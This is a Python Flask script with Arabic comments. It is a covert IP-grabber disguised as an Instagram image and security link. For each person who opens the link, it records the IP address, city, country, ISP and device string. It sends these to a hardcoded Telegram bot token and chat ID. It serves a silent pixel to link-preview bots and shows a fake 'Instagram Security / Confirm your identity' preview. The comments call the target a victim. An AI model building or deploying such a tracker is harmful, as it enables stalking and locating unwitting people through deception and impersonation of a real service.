from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# --- الإعدادات (نفس كودك الناجح) ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg')  # هذا المسار الجديد لخداع انستقرام
def track():
    # جلب البيانات الأساسية
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # تطوير: كشف نوع الطلب (هل هو بوت انستقرام أم ضحية؟)
    ua_lower = user_agent.lower()
    if "facebookexternalhit" in ua_lower or "instagram" in ua_lower:
        status_tag = "🤖 <b>تنبيه: وصول الرسالة (Preview)</b>"
    else:
        status_tag = "🎯 <b>تنبيه: فتح الرابط (Actual Click)</b>"

    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        city = country = isp = "Error"

    report = (
        f"{status_tag}\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent[:100]}...\n"
        f"--------------------------"
    )
    send_to_telegram(report)
    
    # تطوير: إذا كان الطلب من "بوت" المعاينة، نرسل له صورة بكسل ليتم الصيد صمتاً
    if "facebookexternalhit" in ua_lower:
        pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
        return send_file(pixel, mimetype='image/png')

    # الصفحة التمويهية الأصلية الخاصة بك
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:description" content="Confirm your identity to continue.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="website">
    </head>
    <body><h1>404 Not Found</h1></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
